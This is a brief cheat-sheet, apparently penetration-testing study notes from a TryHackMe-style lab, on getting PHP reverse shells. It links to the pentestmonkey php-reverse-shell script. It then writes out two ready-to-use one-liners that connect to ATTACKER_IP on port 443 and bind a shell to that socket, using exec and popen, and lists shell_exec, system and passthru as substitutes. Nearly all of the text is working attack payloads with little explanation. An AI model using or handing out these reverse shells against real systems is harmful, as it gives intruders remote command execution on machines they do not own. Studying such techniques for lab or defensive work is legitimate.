
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz


exec function

```sh
target:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```

You can replace exec with other functions like shell_exec(), system(), passthru()

The `passthru` function executes a command and sends raw output back to the browser. This is useful when working with binary data.

`popen` is used to open a process file pointer
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```

